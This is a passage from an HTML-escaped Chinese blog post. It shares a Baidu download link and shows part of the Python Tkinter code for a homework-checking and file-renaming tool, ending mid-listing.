&lt;li&gt;大大改善了每次收作业时影响同学之间的关系&lt;/li&gt;
&lt;li&gt;大大降低了工作的出错率，提高了自己的容错率&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;address&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#address&#34;&gt;#&lt;/a&gt; Address&lt;/h1&gt;
&lt;p&gt;百度网盘：&lt;/p&gt;
&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXhNY2stWlNvZE94cGNId080UkRFUnc=&#34;&gt;https://pan.baidu.com/s/1xMck-ZSodOxpcHwO4RDERw&lt;/span&gt;&lt;br&gt;
 提取码：rngi&lt;/p&gt;
&lt;p&gt;或者直接来问我要也行～～&lt;/p&gt;
&lt;h1 id=&#34;main-code-displayanalysis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#main-code-displayanalysis&#34;&gt;#&lt;/a&gt; Main code display&amp;amp;analysis&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;主界面实现 (界面示例)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; parent_window&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		parent_window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;destroy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 销毁主界面&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;window &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Tk&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 初始框的声明&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;title&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;check or rename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;width &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;450&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;height &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;330&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token comment&#34;&gt;#获取屏幕尺寸以计算布局参数，使窗口居屏幕中央&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;screenwidth &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;winfo_screenwidth&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;screenheight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;winfo_screenheight&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;alignstr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dx%d+%d+%d&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;width&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;height&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                  &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;screenwidth&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;width&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;screenheight&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;height&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;geometry&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;alignstr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;resizable&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; height&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token comment&#34;&gt;# 定义框架&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex0 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Frame&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;600&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; height&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Frame&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;700&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; height&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Frame&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;700&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; height&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token comment&#34;&gt;# 定义标题&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex0_title &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Label&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex0&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;check&amp;amp;rename:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; font&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Verdana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; fg&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;green&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex0_title&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#定义路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; StringVar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;excel &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; StringVar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#查找功能&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_label &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Label&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;查找未上交：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; font&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Verdana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_button1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ttk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Button&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;添加文件夹&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;command &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;selectPath1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_entry1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Entry&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; textvariable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; font&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Verdana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_button2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ttk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Button&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;添加Excel&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;command &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;selectexcel&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_entry2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Entry&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; textvariable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;excel&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; font&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Verdana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_button3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ttk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Button&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;开始&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; command&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;docmiss_nation&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_label&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_button1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_entry1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; columnspan&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_button2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_entry2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; columnspan&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		